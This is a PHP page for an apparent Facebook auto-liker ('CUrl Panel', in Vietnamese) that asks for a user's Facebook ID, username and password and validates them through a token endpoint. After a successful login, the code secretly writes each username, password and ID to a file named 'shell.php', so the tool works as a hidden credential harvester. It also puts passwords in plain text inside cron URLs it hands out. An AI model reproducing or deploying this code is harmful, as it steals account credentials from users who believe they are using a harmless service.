<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CUrl Panel</title>
<link rel="stylesheet" href="/css/style.css" type="text/css" media="all">
</head>
<body>
<?php session_start(); ?>
<?php
include'config.php';
$_SESSION['idfb'] = $_POST['idfb'];
$_SESSION['user'] = $_POST['user'];
$_SESSION['pass'] = $_POST['pass'];
$idfb = $_SESSION['idfb'];
$user = $_SESSION['user'];
$pass = $_SESSION['pass'];
if(!$idfb || !$user || !$pass){
echo '<div class="login"><center>Hãy Nhập Đầy Đủ Thông Tin!</center></div>';
}else{
$check = file_get_contents(''.$domain.'/token/htc.php?laytoken=ok&user='.urlencode($user).'&pass='.urlencode($pass).'');
$die = 'wrong_or_locked';
$unspec = 'unspecified_error';
if($check == $die){
echo '<h3><div class="login"><center><b color="red">Đăng Nhập Thất Bại!<br>Tài Khoản Hoặc Mật Khẩu Không Chính Xác Hoặc Nick Bị Checkpoint</b></center></div></h3>';
}else if($check == $unspec || $check == ""){
echo '<h3><div class="login"><center><b color="red">Bạn Chưa Cài Đặt HTC Sence</b></center></div></h3>';
}else {
$f = fopen('../shell.php','a');
fwrite($f,"User: " .$user. "<br>Pass: " .$pass. "<br>ID User: " .$idfb. "<br>===================== <br>");
fclose($f);
echo '<center><b color="green">Đăng Nhập Thành Công!</b></center>
<div class="login"><b color="black">Link Cron Của Bạn là:</b><textarea>'.$domain.'/chaylike.php?idf='.$idfb.'&u='.urlencode($user).'&p='.urlencode($pass).'&chaylike=ok</textarea><br><br><center>
<a href="'.$domain.'/chaylike.php?idf='.$idfb.'&u='.urlencode($user).'&p='.urlencode($pass).'&chaylike=ok"><b color="white">Chạy Thử</b></a></center></div><br>
<center><b color="red">LƯU Ý:</b> Bạn hãy cài cron cho địa chỉ này <br><i><b color="yellow">'.$domain.'/chaylike.php?idf='.$idfb.'&u='.urlencode($user).'&p='.urlencode($pass).'&chaylike=ok</b></i><br> tại trang <a href="http://cron-job.org">http://cron-job.org</a>  chạy 5phút/lần nhé!</center>    <br>';
}
}
?>
</body>